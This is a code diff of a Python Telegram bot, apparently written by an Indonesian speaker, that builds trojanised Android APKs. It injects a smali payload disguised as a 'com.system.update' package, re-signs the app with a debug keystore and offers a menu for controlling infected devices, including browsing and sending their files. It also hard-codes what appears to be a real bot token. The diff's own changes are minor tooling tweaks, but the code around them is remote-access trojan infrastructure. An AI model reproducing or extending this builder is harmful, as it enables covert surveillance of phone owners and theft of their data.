@@ -12,13 +12,11 @@ from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandle
 TOKEN = "9153767226:AAG9WkQcikOjpFiwWKpQ8GkRC92xOUO92sc" 
 ALLOWED_CHAT_ID = 8598136412 
 
-# PATH UDAH DISESUAIKAN KE FOLDER r4t
 WORK_DIR = "/data/data/com.termux/files/home/r4t" 
 KEYSTORE_PATH = f"{WORK_DIR}/app_debug.keystore"
 KEYSTORE_PASS = "123456"
 KEY_ALIAS = "debugkey"
 PAYLOAD_SMALI_DIR = f"{WORK_DIR}/payload_smali/com/system/update"
-ZIPALIGN_JAR = f"{WORK_DIR}/zipalign.jar" 
 
 os.makedirs(WORK_DIR, exist_ok=True)
 logging.disable(logging.CRITICAL)
@@ -109,7 +107,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         zip_path = f"{WORK_DIR}/backup_r4t.zip"
         try:
             with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                for file in ["builder_bot.py", "app_debug.keystore", "zipalign.jar", "devices.db"]:
+                for file in ["builder_bot.py", "app_debug.keystore", "zipalign", "devices.db"]:
                     filepath = f"{WORK_DIR}/{file}"
                     if os.path.exists(filepath):
                         zipf.write(filepath, file)
@@ -134,7 +132,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == "back_start":
         await start(update, context)
         
-    # ── MENU KONTROL DEVICE (13 FITUR) ──
     elif query.data == "device_1":
         keyboard = [
             [InlineKeyboardButton("📂 Cek File", callback_data="cmd_cek_file"), InlineKeyboardButton("📤 Send File", callback_data="cmd_send_file")],
@@ -152,7 +149,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
 
-    # ── EKSEKUSI TOMBOL (NEMBAK KE CHAT) ──
     elif query.data.startswith("cmd_"):
         perintah = "/" + query.data.replace("cmd_", "")
         await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text=perintah)
@@ -189,7 +185,8 @@ async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_p
         await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="🔐 [5/5] Menandatangani APK...")
         signed_apk = f"{apk_new_path}.signed.apk"
         
-        subprocess.run(f"java -jar {ZIPALIGN_JAR} -p -f 4 '{apk_new_path}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
+        # NGGAK PAKE JAR LAGI, LANGSUNG PANGGIL ZIPALIGN BAWAAN TERMUX
+        subprocess.run(f"zipalign -p -f 4 '{apk_new_path}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
         subprocess.run(f"apksigner sign --ks {KEYSTORE_PATH} --ks-pass pass:{KEYSTORE_PASS} --ks-key-alias {KEY_ALIAS} --out '{signed_apk}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
 
         await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="✅ **BUILD SUKSES!** APK siap di-install:", parse_mode='Markdown')
